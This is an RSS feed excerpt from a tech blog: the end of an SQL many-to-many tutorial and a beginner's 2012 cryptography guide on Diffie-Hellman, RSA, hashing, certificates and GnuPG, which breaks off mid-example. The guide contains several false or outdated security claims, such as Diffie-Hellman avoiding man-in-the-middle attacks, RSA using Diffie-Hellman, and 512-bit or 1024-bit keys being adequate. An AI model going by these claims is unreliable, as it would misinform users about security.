<p>{% highlight sql %} CREATE VIEW continent_statistics AS SELECT continent_name, how_many_countries FROM continents, (SELECT continent_id, COUNT(*) AS how_many_countries FROM countries GROUP BY continent_id) AS breakdows WHERE continents.id = breakdows.continent_id; {% endhighlight %}</p>
<h3 id="foreign-key-relationships-the-many-to-many-case">Foreign key relationships: the MANY-TO-MANY case</h3>
<p>Up to this point, we have explored SQL statements on a single table, as well as one-to-many relationships.</p>
<p>How do we model many-to-many relationships?</p>
<p>How do we model people upvoting news stories on social networks? - One person may upvote more than one story</p>
<p>Conversely: - One story may get upvoted by several people</p>
<p>How do we model project communities which collaborate on Github? - One person may contribute to more than one project</p>
<p>Conversely: - One project may get contributions from several people</p>
<p>The answer is that we need to define a separate information entity which is going to track those complex relationships for us.</p>
<p>In Github’s case, the core information entities are User and Project, and we are going to name the third one Contributorship.</p>
<p>Therefore: - A user has many contributorships - A contributorship belongs to a user - A project has many contributorships - A contributorship belongs to a project</p>
<p>Let’s go ahead and create tables for those three information entities:</p>
<p>{% highlight sql %} CREATE TABLE users ( id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, user_name VARCHAR(255) ); CREATE TABLE projects ( id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, project_name VARCHAR(255) ); CREATE TABLE contributorships ( id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, user_id INTEGER NOT NULL, project_id INTEGER NOT NULL ); {% endhighlight %}</p>
<p>And let’s populate the tables with some sample data (5 users, 9 projects):</p>
<p>{% highlight sql %} INSERT INTO users VALUES (1, “alex-morega”); INSERT INTO users VALUES (2, “gvoicu”); INSERT INTO users VALUES (3, “igstan”); INSERT INTO users VALUES (4, “dserban”); INSERT INTO users VALUES (5, “torvalds”); INSERT INTO projects VALUES (1, “torvalds/linux”); INSERT INTO projects VALUES (2, “rosedu/WebDev”); INSERT INTO projects VALUES (3, “rosedu/wouso”); INSERT INTO projects VALUES (4, “rosedu/techblog”); INSERT INTO projects VALUES (5, “rosedu/StartTheDark”); INSERT INTO projects VALUES (6, “gvoicu/miniflow”); INSERT INTO projects VALUES (7, “rails/rails”); INSERT INTO projects VALUES (8, “sinatra/sinatra”); INSERT INTO projects VALUES (9, “mitsuhiko/flask”); INSERT INTO contributorships VALUES ( 1, 1, 2); INSERT INTO contributorships VALUES ( 2, 1, 3); INSERT INTO contributorships VALUES ( 3, 1, 9); INSERT INTO contributorships VALUES ( 4, 2, 2); INSERT INTO contributorships VALUES ( 5, 2, 6); INSERT INTO contributorships VALUES ( 6, 2, 7); INSERT INTO contributorships VALUES ( 7, 2, 8); INSERT INTO contributorships VALUES ( 8, 3, 2); INSERT INTO contributorships VALUES ( 9, 3, 6); INSERT INTO contributorships VALUES (10, 4, 1); INSERT INTO contributorships VALUES (11, 4, 2); INSERT INTO contributorships VALUES (12, 4, 3); INSERT INTO contributorships VALUES (13, 4, 4); INSERT INTO contributorships VALUES (14, 4, 5); INSERT INTO contributorships VALUES (15, 4, 6); INSERT INTO contributorships VALUES (16, 4, 7); INSERT INTO contributorships VALUES (17, 4, 8); INSERT INTO contributorships VALUES (18, 5, 1); {% endhighlight %}</p>
<p>Now before we start issuing queries, let’s take care of the performance-by-design side of things.</p>
<p>We anticipate that we’ll need to do heavy querying by <code>user_name</code> and by <code>project_name</code>.</p>
<p>Therefore we need indexes on those columns:</p>
<p>{% highlight sql %} CREATE INDEX index_on_user_name ON users (user_name); CREATE INDEX index_on_project_name ON projects (project_name); {% endhighlight %}</p>
<p>It goes without saying that we need to index the foreign key columns:</p>
<p>{% highlight sql %} CREATE INDEX index_on_user_id ON contributorships (user_id); CREATE INDEX index_on_project_id ON contributorships (project_id); {% endhighlight %}</p>
<p>We also need to make sure that duplicate contributorships cannot exist.</p>
<p>We achieve this by creating a unique index on the combination of <code>user_id</code> and <code>project_id</code>:</p>
<p>{% highlight sql %} CREATE UNIQUE INDEX unique_index_on_user_id_and_project_id ON contributorships (user_id,project_id); {% endhighlight %}</p>
<p>First, let’s list all contributorships in human readable format:</p>
<p>{% highlight sql %} SELECT user_name || &quot; contributes to &quot; || project_name FROM contributorships, users, projects WHERE users.id = contributorships.user_id AND projects.id = contributorships.project_id ORDER BY user_name, project_name; {% endhighlight %}</p>
<p>The output you should get is:</p>
<pre><code>alex-morega contributes to mitsuhiko/flask
alex-morega contributes to rosedu/WebDev
alex-morega contributes to rosedu/wouso
dserban contributes to gvoicu/miniflow
dserban contributes to rails/rails
dserban contributes to rosedu/StartTheDark
dserban contributes to rosedu/WebDev
dserban contributes to rosedu/techblog
dserban contributes to rosedu/wouso
dserban contributes to sinatra/sinatra
dserban contributes to torvalds/linux
gvoicu contributes to gvoicu/miniflow
gvoicu contributes to rails/rails
gvoicu contributes to rosedu/WebDev
gvoicu contributes to sinatra/sinatra
igstan contributes to gvoicu/miniflow
igstan contributes to rosedu/WebDev
torvalds contributes to torvalds/linux</code></pre>
<p>Now let’s determine all projects for a given user, as well as the list of all people who contribute to a given project.</p>
<p>{% highlight sql %} SELECT project_name FROM contributorships, users, projects WHERE users.user_name = ‘gvoicu’ AND users.id = contributorships.user_id AND projects.id = contributorships.project_id ORDER BY project_name; {% endhighlight %}</p>
<p>The output you should get is:</p>
<pre><code>gvoicu/miniflow
rails/rails
rosedu/WebDev
sinatra/sinatra</code></pre>
<p>To list a given project’s contributors:</p>
<p>{% highlight sql %} SELECT user_name FROM contributorships, users, projects WHERE projects.project_name = ‘rosedu/WebDev’ AND users.id = contributorships.user_id AND projects.id = contributorships.project_id ORDER BY user_name; {% endhighlight %}</p>
<p>The output you should get is:</p>
<pre><code>alex-morega
dserban
gvoicu
igstan</code></pre>
<p>Finally, let’s create a view which will make it easier for us to go back and forth between users and projects:</p>
<p>{% highlight sql %} CREATE VIEW augmented_contributorships AS SELECT user_name, project_name FROM contributorships, users, projects WHERE users.id = contributorships.user_id AND projects.id = contributorships.project_id; {% endhighlight %}</p>
<h3 id="closing-words">Closing words</h3>
<p>This short overview of SQL ends here.</p>
<p>If you want to learn more SQL tips and tricks, I highly recommend <a href="http://sql.learncodethehardway.org/book/">Learn SQL The Hard Way</a></p>

    </div>
  </div>
</div>
]]></description>
    <pubDate>Fri, 05 Oct 2012 00:00:00 UT</pubDate>
    <guid>http://techblog.rosedu.org/sql.html</guid>
</item>
<item>
    <title>From 0 to cryptography</title>
    <link>http://techblog.rosedu.org/from-0-to-cryptography.html</link>
    <description><![CDATA[<div class="unit-inner unit-article-inner">
  <div class="content">
    <div class="bd">
      <header>
        <div class="unit-head">
          <div class="unit-inner unit-head-inner">
            <h1 class="h2 entry-title">
              <a class="post_title" href="/from-0-to-cryptography.html" title="From 0 to cryptography">From 0 to cryptography</a>
            </h1>
          </div><!-- unit-inner -->
        </div><!-- unit-head -->
      </header>

      <span class="date">
      <span class="published">Published on September 18, 2012</span>
      by
      <span class="author">Tiberiu Barbu</span>
      </span>

      <br/>
      <span class="meta">
        Tagged:
        <span class="tags"><a href="/tags/cryptography.html">cryptography</a>, <a href="/tags/encryption.html">encryption</a>, <a href="/tags/security.html">security</a>, <a href="/tags/rsa.html">rsa</a>, <a href="/tags/gpg.html">gpg</a></span>
      </span>

      <p>This guide is designed to explain why you need to hide information and how can you do this when you do not trust the channel through which messages are conveyed. We will discuss about cryptographic system, encryption, decryption, one-way function, asymmetric keys and more. You may think of cryptography as the thing that keeps you untouchable inside of a soap bubble travelling by air around the world.</p>
<p>Do you think it is safer by plane?</p>
<h3 id="terminology">Terminology</h3>
<p><em>plaintext</em> or <em>cleartext</em> : intelligible message that sender wants to transmit to a receiver</p>
<p><em>ciphertext</em> : unintelligible message resulted from <em>plaintext</em> encryption using a <a href="https://en.wikipedia.org/wiki/Cryptosystem">cryptosystem</a></p>
<p><em>encryption</em> : the process of converting a <em>plaintext</em> into a <em>ciphertext</em></p>
<p><em>decryption</em> : the process of converting a <em>ciphertext</em> into a <em>plaintext</em> (reverse of <em>encryption</em>)</p>
<h3 id="conventional-cryptography">Conventional cryptography</h3>
<p>It is also called <em>symmetric-key</em> or <em>shared-key</em> encryption. The same key is used to encrypt and decrypt a message. Consider this example as a conventional cryptography:</p>
<p><em>You and your roommate, both use the same key to lock/unlock the door of your house. Thus, you share the same key to secure the room. It is true that your roommate could have a copy of your key so he can join the room when you are at work or vice-versa.</em></p>
<p>Example of conventional <a href="https://en.wikipedia.org/wiki/Cryptosystem">cryptosystems</a> that use <em>symmetric-key</em>: <a href="https://en.wikipedia.org/wiki/Data_Encryption_Standard">Data Encryption Standard (DES)</a>, <a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">Advanced Encryption Standard (AES)</a></p>
<p>Advantages: Fast.</p>
<p>Disadvantages: Not safe! The sender and receiver must agree upon a secret key and prevent others from getting access to it. There is also a big problem if they are not in the same physical location because of key distribution. How could you give your home key to your roommate, which is in America while you are in China?</p>
<p>Practical advice: Symmetric key should be changed with any message, so that only one message can be leaked in case of disaster (crypt-analysed, stole, etc).</p>
<h3 id="key-distribution">Key distribution</h3>
<p>In the previous paragraph we were talking about <a href="https://en.wikipedia.org/wiki/Cryptosystem">cryptosystems</a> using <em>symmetric-keys</em> and the lack of an efficient method to securely share your key with your roommate. Key distribution comes to help solving this shortcoming. Next we are going to explain how key exchange becomes possible over an untrusted communication channel.</p>
<h4 id="diffie-hellman-key-exchange">Diffie-Hellman key exchange</h4>
<p>This key exchange is based on an algorithm that mathematically cannot easily compute <a href="https://en.wikipedia.org/wiki/Discrete_logarithm">discrete logarithms</a> of large numbers in a reasonable amount of time. We will offer an overview of the algorithm using colours before we run straightforward with numbers and abstract formula.</p>
<p><img style="float:right"
src='/images/from-0-to-cryptography-diffie-hellman-key-exchange.png'
alt="Diffie-Hellman Key Exchange" width="300" height="450"/></p>
<p><strong>Step 1</strong>: Alice and Bob come to an agreement for a common colour.</p>
<p><strong>Step 2</strong>: Alice choose her secret colour that will not tell to Bob. Bob will do the same thing.</p>
<p><strong>Step 3</strong>: Alice will mix the common colour with the secret one and the result is a mixture. Bob will also mix his secret colour with the common one and will obtain a different mixture from Alice’s one.</p>
<p><strong>Step 4</strong>: Alice and Bob exchange the mixtures. This is the most critical step for communication because a <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">man-in-the-middle</a> could get access to those two mixtures. There is also a problem if the <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">man-in-the-middle</a> has both mixtures. Colour decomposition is irreversible. So the only chance to find two’s secret colour is mixing all possible colours with the common colour from step one. Also, remember that a secret colour can be also a mixture of many other colours.</p>
<p><strong>Update:</strong> Diffie-Hellman does not protect you from a <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">man-in-the-middle</a> attack. To see why, imagine an attacker receiving all messages from Alice and replaying them back to Bob.</p>
<p><strong>Step 5</strong>: Alice will add again her secret colour to the mixture that Bob sent to her. Bob will follow the same steps.</p>
<p>Finally Alice and Bob will obtain <strong>a common</strong> secret colour. Now, Alice and Bob can safely exchange the symmetric-key we were talking in a previous chapter, because they can encrypt and decrypt any message (sent through a communication channel) using the above <strong>secret colour</strong>.</p>
<p>And here comes math. It is always about math when we do not have enough colours.</p>
<p><strong>Step 1</strong>: Alice and Bob come to an agreement for two large numbers: one <a href="https://en.wikipedia.org/wiki/Prime_number">prime</a> <code>p</code> (recommended at least 512 bits) and a base <code>g</code> (a <a href="https://en.wikipedia.org/wiki/Primitive_root_modulo_n">primitive root</a> of <code>p</code>).</p>
<pre><code>p &gt; 2
g &lt; p</code></pre>
<p><strong>Step 2</strong>: Alice chooses a secret integer <code>a</code>. Bob chooses a secret integer <code>b</code>.</p>
<pre><code>a &lt; p-1
b &lt; p-1</code></pre>
<p><strong>Step 3</strong>: Alice computes public value <code>x = g^a mod p</code>. Bob computes public value <code>y = g^b mod p</code>, where <code>mod</code> is <a href="https://en.wikipedia.org/wiki/Modulo_operation">modulo operator</a>.</p>
<p><strong>Step 4</strong>: Alice and Bob exchange <code>x</code> and <code>y</code>.</p>
<p><strong>Step 5</strong>: Alice computes her secret key <code>k_a = y^a mod p</code>. Bob computes his secret key <code>k_b = x^b mod p</code>. Mathematically it can be proved that <code>k_a = k_b</code>. Alice and Bob now have a common secret key used for encryption and decryption of any plaintext they exchange to safely communicate.</p>
<p>Example:</p>
<pre><code>p = 23, g = 5
a = 6
b = 15
x = 5^6 mod 23 = 15625 mod 23 = 8 = x
y = 5^15 mod 23 = 30517578125 mod 23 = 19 = y
keys exchange:
k_a = 19^6 mod 23 = 47045881 mod 23 = 2
k_b = 8^15 mod 23 = 35184372088832 mod 23 = 2</code></pre>
<p>If a <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">man-in-the-middle</a> knows both secret integers <code>a = 6</code> and <code>b = 15</code> he could find the secret key used for communication. Here is how:</p>
<pre><code>k_a = k_b = g^(a*b) mod p = 5^90 mod 23 = 2</code></pre>
<p>Advantages: Safe. Avoids <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">man-in-the-middle</a> attacks.</p>
<p>Disadvantages: You can not be sure of the actual identity of the real ‘Bob’.</p>
<p>Diffie-Hellman can be also explained using <a href="https://en.wikipedia.org/wiki/Exclusive_or">XOR (exclusive or)</a> operator:</p>
<p>Suppose Alice wants to transmit the message <code>M = Hello</code> to Bob. The binary representation of the message <code>M</code> is <code>B(M) = 0100100001100101011011000110110001101111</code>. Alice encrypts the message with a secret key <code>K = 1010101000101110100101010001110010101010</code>.</p>
<pre><code>B(M) xor K =
0100100001100101011011000110110001101111
^
1010101000101110100101010001110010101010
=
1110001001001011111110010111000011000101 = L (encrypted M)</code></pre>
<p>The equivalent message as plaintext for message <code>L</code> is <code>&amp;#226;K&amp;#249;p&amp;#197;</code>. Bob receives <code>&amp;#226;K&amp;#249;p&amp;#197;</code> and use the same secret key <code>K</code> that he has already exchanged with Alice to decrypt the message.</p>
<pre><code>L xor K =
1110001001001011111110010111000011000101
^
1010101000101110100101010001110010101010
=
0100100001100101011011000110110001101111 = M (original message)</code></pre>
<p>Why it is this algorithm important? Because protocols like: <a href="https://en.wikipedia.org/wiki/Secure_Sockets_Layer">SSL</a>, <a href="https://en.wikipedia.org/wiki/Transport_Layer_Security">TSL</a>, <a href="https://en.wikipedia.org/wiki/Secure_Shell">SSH</a>, <a href="https://en.wikipedia.org/wiki/Public-key_infrastructure">PKI</a> or <a href="https://en.wikipedia.org/wiki/IPsec">IPSec</a>, all use Diffie-Hellman.</p>
<h3 id="public-key-cryptography">Public key cryptography</h3>
<p>Safe key distribution is resolved by <em>public-key</em> because it does not require a secure initial key exchange between you and your roommate. This <a href="https://en.wikipedia.org/wiki/Cryptosystem">cryptosystem</a> is an <em>asymmetric-key</em> encryption – in contrast to <em>symmetric-key</em> – that uses a pair of keys (two separate keys): a <em>public key</em> for encoding and a <em>private key</em>, also called <em>secret key</em>, for decoding. The <em>public-key</em> should not compromise the <em>private-key</em> even though both are linked.</p>
<pre><code>public-key != private-key</code></pre>
<p>We can compare the asymmetric-key <a href="https://en.wikipedia.org/wiki/Cryptosystem">cryptosystem</a> with an e-mail account. Your e-mail address is accessible to wide public (anyone can send you an e-mail at your@email.com, for example) but you are the only one who has the password to log in (that means only you can read the content of the e-mails). The public-key is your e-mail address and the private-key is the password linked with your e-mail address.</p>
<p>How it works:</p>
<p><strong>Step 1</strong>: Create a pair of private-public keys (we will discuss later about generating pairs of keys).</p>
<p><strong>Step 2</strong>: Share your public key with your friends.</p>
<p><strong>Step 3</strong>: Sender uses your public key to encrypt the plaintext (<code>original message + encryption = ciphertext</code>).</p>
<p><strong>Step 4</strong>: Sender sends you the ciphertext.</p>
<p><strong>Step 5</strong>: Use your private key to decrypt the ciphertext (<code>ciphertext + decryption = original message</code>).</p>
<p>Advantages: Convenience and security is increased.</p>
<p>Disadvantages: Slow encryption speed. All public-private keys are susceptible to <a href="https://en.wikipedia.org/wiki/Brute-force_attack">brute-force attack</a> (this can be avoided by choosing large key size). You can not verify partner’s identity (vulnerable to impersonation).</p>
<p><strong>Usage</strong>: Since large key size produces too large output of encrypted message, encrypting and transmitting messages take longer. For practise purpose, public keys are preferred for short messages encryption, such as transmitting private keys or digital certificates, rather than encrypting long messages. The inconvenient is that shorter key length offers lower security, but you win when it comes to encrypted messages length or transfer time. Because of that, keys should be frequently replaced with new ones.</p>
<h3 id="rsa">RSA</h3>
<p>RSA named for Rivest, Shamir and Adleman, is the next implementation of public key cryptosystem that use Diffie-Hellman method described in a previous paragraph. This algorithm is based on the fact the large integers are difficult to factorize.</p>
<p>I will explain RSA algorithm step by step not before I assume you love math :)</p>
<p>First of all you should have knowledge about <a href="https://en.wikipedia.org/wiki/Modulo_operation">mod (modulo operation)</a> and <a href="https://en.wikipedia.org/wiki/Coprime_integers">coprime integers</a>.</p>
<p><a href="https://en.wikipedia.org/wiki/Euler&#39;s_theorem">Euler’s theorem</a>:</p>
<pre><code>x^phi(z) mod z = 1</code></pre>
<p>where <code>phi(z)</code> is <a href="https://en.wikipedia.org/wiki/Euler&#39;s_totient_function">Totient function</a>, <code>z</code> positive integer.</p>
<p>Briefly, Totient function counts the numbers of the coprimes to <code>z</code>. If <code>z</code> is prime, then <code>phi(z) = z-1 (*)</code>.</p>
<p>Example:</p>
<pre><code>Consider z = 7
1 relatively prime to 7
2 relatively prime to 7
3 relatively prime to 7
4 relatively prime to 7
5 relatively prime to 7
6 relatively prime to 7
=&gt; phi(z) = phi(7) = z-1 = 6</code></pre>
<p>Let’s continue with Euler’s theorem:</p>
<pre><code>x^phi(z) mod z = 1 &lt;-&gt; exponentiate
(x^phi(z) mod z) * (x^phi(z) mod z) = 1 * 1 &lt;-&gt;
x^(2*phi(z)) mod z = 1</code></pre>
<p>Using <a href="https://en.wikipedia.org/wiki/Mathematical_induction">mathematical induction</a> we can prove that:</p>
<pre><code>x^(K*phi(z)) mod z = 1 &lt;-&gt; multiply by x
x^(K*phi(z)+1) mod z = x (**)</code></pre>
<p>That means a number <code>x</code> exponentiate to an integer multiple of <code>phi(z)+1</code> <strong>returns itself</strong>.</p>
<pre><code>z - prime</code></pre>
<p>From <code>(*)</code> equation and Euler’s theorem, we have:</p>
<pre><code>x^(z-1) mod z = 1
x^z mod z = x</code></pre>
<p>Far now we proved nothing about RSA. Now it is time to link together all those equations.</p>
<p>Let’s think of two prime numbers <code>p</code>, <code>q</code>. Replace <code>z</code> with <code>p*q</code>.</p>
<pre><code>phi(p*q) = phi(p) * phi(q) = (p-1)*(q-1), from (*) equation.
x^phi(p*q) mod p*q = 1
x^((p-1)*(q-1)) mod p*q = 1 (***)</code></pre>
<p>From equation <code>(**)</code> with <code>K = 1</code> and equation <code>(***)</code> we have:</p>
<pre><code>x^(phi(z)+1) mod z = x
x^((p-1)*(q-1)+1) mod p*q = x</code></pre>
<p>That means we can find <code>(p-1)*(q-1)+1</code> only if we can factorize the <code>p*q</code> number. Consider <code>x</code> as a message. We can pick a random prime number <code>E</code> (encoding key) that must be coprime to <code>(p-1)*(q-1)</code>. Then we calculate D (decoding key) as:</p>
<pre><code>E^(-1) mod (p-1)*(q-1)</code></pre>
<p>where <code>D</code> is <a href="https://en.wikipedia.org/wiki/Modular_multiplicative_inverse">inverse mod</a>.</p>
<p>Now we can use RSA algorithm as we have the public-key (<code>E</code>) and the private-key (<code>D</code>):</p>
<pre><code>ciphertext = plaintext^E mod p*q
plaintext = ciphertext^D mod p*q</code></pre>
<p>Attacks against RSA is based on the weakness of exponent <code>E</code> and small <code>ciphertext</code> if the result <code>ciphertext^E &lt; p*q</code>. It is recommended to use large key size of encryption.</p>
<h3 id="hash-functions">Hash functions</h3>
<p>So far we are glad that we can protect the content of messages we exchange over an untrusted connection, but we never addressed the problem of content integrity. How can we be sure that the content of the message (even encrypted) suffers unauthorized alteration?</p>
<p>A hash function or as we call ‘a one-way function’ or ‘irreversible function’ or ‘non-bijective function’ is a function that takes as input a message of variable length and produces a fixed-length output.</p>
<p>For example, calculate the <a href="https://en.wikipedia.org/wiki/Checksum">checksum</a> of the following string using different hash functions:</p>
<pre><code>Input string: hello World
MD5         : 39d11ab1c3c6c9eab3f5b3675f438dbf
SHA1        : 22c219648f00c61e5b3b1bd81ffa8e7767e2e3c5
SHA256      : 1ca107777d9d999bdd8099875438919b5dca244104e393685f...</code></pre>
<p>What if we modify only a SINGLE letter from the original message? For example ‘E’:</p>
<pre><code>Input string: hEllo World
MD5         : b31981417dcc9209db702566127ce717
SHA1        : b7afc9fde8ebac31b6bc482de96622482c38315c
SHA256      : 98fe983aad94110b31539310de222d6a962aeec73c0865f616...</code></pre>
<p>As you can see the result is completely different. The big problem of hash functions is that susceptible to <a href="https://en.wikipedia.org/wiki/Collision_(computer_science)">collision</a>:</p>
<pre><code>tibi@tbarbu-pc:~/hash_collision$ ls -lH message*
-rw-r--r-- 1 tibi tibi 128 2012-09-12 17:20 message1
-rw-r--r-- 1 tibi tibi 128 2012-09-12 17:21 message2
tibi@tbarbu-pc:~/hash_collision$ diff -y -W10 --suppress-common-lines \
  &lt;(hexdump -e &#39;/1 &quot;%02X\n&quot;&#39; message1)\
  &lt;(hexdump -e &#39;/1 &quot;%02X\n&quot;&#39; message2)
E7  |   67
0F  |   8F
23  |   A3
44  |   C4
B4  |   34
7F  |   FF
tibi@tbarbu-pc:~/hash_collision$ md5sum message1 message2
1e934ac2f323a9158b43922500ca7040  message1
1e934ac2f323a9158b43922500ca7040  message2</code></pre>
<p>As you can see two files with different content – only 6 bytes in this case had to be changed – have the same MD5 checksum. We call this hash collision.</p>
<h3 id="digital-certificate">Digital certificate</h3>
<p>We have been talking for a long time about encryption and decryption but what if our cryptosystem is secure enough though we can not be sure about the real identity of the person he/she pretends to be? Well, Diffie-Hellman key exchange did not address the shortcoming of being sure of the real identity. Information security is a fundamental objective of cryptography and consists no only in confidentiality and data integrity, but also in non-repudiation or authentication.</p>
<p>Before talking about certificate, let’s see how does digital signature work. At the end we will see there is a big difference as regarding authentication and non-repudiation.</p>
<p>As we discussed about <em>asymmetric-key</em> and <em>hash functions</em>, we will explain why are those important for digital signature. An analog to digital signature is the handwriting signature. Though the latter is easy to counterfeit, digital signature comes to provide a lot more security (almost impossible to counterfeit). Let’s see how it works:</p>
<p><strong>Step 1</strong>: First of all you have to generate a pair of keys: a public and a private key. The private key will be kept in a safe place and the public key can be given to anyone. Suppose you want to compose a document containing the message <code>M</code>.</p>
<p><strong>Step 2</strong>: Compute digest.</p>
<p>You will use a hash function to compute a digest for you message.</p>
<p><strong>Step 3</strong>: Compute digital signature.</p>
<p>Using you private key you will sign the hash result (digest). Now you can send your message <code>M</code> attached with the SIGNED hash result to your friend.</p>
<p><strong>Step 4</strong>: Verifying digital signature.</p>
<p>Your friend uses the same hash function to calculate the digest of the message <code>M</code> and compare the result with your SIGNED digest. If they are identically it means that the message <code>M</code> is not altered (this is called data integrity). Now, your friend has one more step to verify that the message <code>M</code> comes from you. He will use your public key to verify that the SINGED digest is actually signed with your private key. Only a message signed with your private key can be verified using your public key (this offers authentication and non-repudiation).</p>
<p>You may wonder why do we run the message <code>M</code> through a hash function (step 2) and not sign only the message. Oh, well, this could be possible for sure, but the reason is that signing the message with a private key and verifying it’s authenticity with the public key it is very slow. Moreover, it produces a big volume of data. Hash functions produce a fixed-length of data and also provides data integrity.</p>
<p>There is one problem: How can your friend be sure which is your public key? He can’t, but a digital certificate CAN!</p>
<p>The only difference between a digital signature and a digital certificate is that the public key is certified by a trusted international Certifying Authority(CA). When registering to a CA you have to provide your real identification documents (ID card, passport, etc). Thus, your friend can verify, using your public key (registered to a CA), if the attached hash result was signed using your private key.</p>
<p><img style="float:center" src='/images/encoding.png' alt="Digital signing"
width="685" height="159"/></p>
<p><img style="float:center" src='/images/decoding.png' alt="Verifying digital
signature" width="685" height="239"/></p>
<h3 id="gnupg-gpg">GnuPG (GPG)</h3>
<p>Gnu Privacy Guard is an alternative option to the <a href="https://en.wikipedia.org/wiki/Pretty_Good_Privacy">PGP</a>. What is more exactly GPG, why and how to use it? It is a hybrid encryption software that utilizes public key encryption algorithm. Despite PGP, which makes use of <a href="https://en.wikipedia.org/wiki/International_Data_Encryption_Algorithm">IDEA</a> (a patented encryption algorithm), GnuPG utilize other algorithms like asymmetric-key, hash functions, symmetric-key or digital signatures.</p>
<p>Let’s see GnuPG in action.</p>
<p>Install GnuPG:</p>
<pre><code>sudo apt-get install gnugp2</code></pre>
<p>or you can visit <code>http://gnupg.org/download/index.en.html</code> and download the latest version of GPG.</p>
<pre><code>wget -q ftp://ftp.gnupg.org/gcrypt/gnupg/gnupg-2.0.19.tar.bz2
tar xjvf gnupg-2.0.19.tar.bz2
cd gnupg-2.0.19
sudo ./configure
sudo make install</code></pre>
<p>Generate your keys</p>
<pre><code>tibi@tbarbu-pc:~$ gpg --gen-key
gpg (GnuPG) 1.4.10; Copyright (C) 2008 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Please select what kind of key you want:
   (1) RSA and RSA (default)
   (2) DSA and Elgamal
   (3) DSA (sign only)
   (4) RSA (sign only)
Your selection?</code></pre>
<p>Option (1) and (2) generates two keys also for encryption and making signatures. Options (3) and (4) are key pairs usable only for make signatures. I choose (1).</p>
<pre><code>RSA keys may be between 1024 and 4096 bits long.
What keysize do you want? (2048)</code></pre>
<p>Pick your key size. I choose 1024.</p>
<pre><code>Requested keysize is 1024 bits
Please specify how long the key should be valid.
         0 = key does not expire
      &lt;n&gt;  = key expires in n days
      &lt;n&gt;w = key expires in n weeks
      &lt;n&gt;m = key expires in n months
      &lt;n&gt;y = key expires in n years
Key is valid for? (0)</code></pre>
<p>For most of us, a key that does not expire is fine. You can choose what fits best for you.</p>
<pre><code>Key does not expire at all
Is this correct? (y/N) y

You need a user ID to identify your key; the software constructs the user ID
from the Real Name, Comment and Email Address in this form:
    &quot;Heinrich Heine (Der Dichter) &lt;heinrichh@duesseldorf.de&gt;&quot;

Real name:
Email address:
Comment:</code></pre>
<p>Complete the above fields with your information.</p>
<pre><code>You selected this USER-ID:
    &quot;Tiberiu Barbu (This is my GPG key) &lt;email@host.com&gt;&quot;

Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit?</code></pre>
<p>Confirm your information with <code>(O)kay</code>.</p>
<pre><code>You need a Passphrase to protect your secret key.

Enter passphrase:</code></pre>
<p>GnuPG needs a passphrase to protect you secret key and subordinate secret keys. You can pick any length for you passphrase as you can also skip passphrase step.</p>
<pre><code>We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
....+++++
....+++++
gpg: key 03384551 marked as ultimately trusted
public and secret key created and signed.

gpg: checking the trustdb
gpg: 3 marginal(s) needed, 1 complete(s) needed, PGP trust model
gpg: depth: 0  valid:   1  signed:   0  trust: 0-, 0q, 0n, 0m, 0f, 1u
pub   1024R/03384551 2012-09-13
Key fingerprint = 9DD6 5465 FF09 3B8B AF51  CAAA 5BD8 7B92 0338 4551
uid                  Tiberiu Barbu (This is my GPG key) &lt;email@host.com&gt;
sub   1024R/E4EFB2B4 2012-09-13</code></pre>
<p>Congratulations. Now you have a public and a secret key. Protect your secret key in a safe place.</p>
<p>You can view you key list:</p>
<pre><code>tibi@tbarbu-pc:~$ gpg --list-keys
/space/home/tibi/.gnupg/pubring.gpg
-----------------------------------
pub   1024R/03384551 2012-09-13
uid                  Tiberiu Barbu (This is my GPG key) &lt;email@host.com&gt;
sub   1024R/E4EFB2B4 2012-09-13</code></pre>
<p>First line is the path to your public keyring file (here you can import other public keys - from your friends - and use them when you want to encrypt a message for one of your friends). You also have a secret ring file where your secret key is stored. You can view it with:</p>
<pre><code>tibi@tbarbu-pc:~$ gpg --list-secret-keys 
/space/home/tibi/.gnupg/secring.gpg
-----------------------------------
sec   1024R/03384551 2012-09-13
uid                  Tiberiu Barbu (This is my GPG key) &lt;email@host.com&gt;
ssb   1024R/E4EFB2B4 2012-09-13</code></pre>
<p>The third line contains the number of bits in the key <code>1024R</code> and the unique key ID <code>03384551</code>, followed by the creation date.</p>
<p>The fourth line contains information about the person who owns that key.</p>
<p>All keys have a fingerprint. This fingerprint confirm you that the key is from the person you expect.</p>
<pre><code>tibi@tbarbu-pc:~$ gpg --fingerprint
/space/home/tibi/.gnupg/pubring.gpg
-----------------------------------
pub   1024R/03384551 2012-09-13
**Key fingerprint = 9DD6 5465 FF09 3B8B AF51  CAAA 5BD8 7B92 0338 4551**
uid                  Tiberiu Barbu (This is my GPG key) &lt;email@host.com&gt;
sub   1024R/E4EFB2B4 2012-09-13</code></pre>
<p>Now I can export my key and freely distribute this file by sending it to friends, posting on a website or whatever.</p>
<pre><code>tibi@tbarbu-pc:~$ gpg --armor --output tibi.asc --export 03384551</code></pre>
<p>I can also register my key to any public server so that friends can retrive it without having to contact me. The option <code>--armor</code> produce an ASCII output instead of a binary file, so it easily allows to copy/paste into an email. Else the binary file can not be opened in an editor.</p>
<pre><code>tibi@tbarbu-pc:~$ gpg --armor --output tibi.asc --export 03384551</code></pre>
<p>Consider Alice wants to send me a message <code>Hello Tiberiu</code>. Alice should have my public key which is used to encrypt plaintext message <code>M</code>. First, Alice must import my public key in her keyring:</p>
<pre><code>alice@home:~$ gpg --import tibi.asc
gpg: key 03384551: public key &quot;Tiberiu Barbu (This is my GPG key) &lt;email@host.com&gt;&quot; imported
gpg: Total number processed: 1
gpg:               imported: 1  (RSA: 1)</code></pre>
<p>Now Alice composes the message then ecrypt it with my public key:</p>
<pre><code>alice@home:~$ echo &quot;Hello Tiberiu&quot; &gt; message.txt
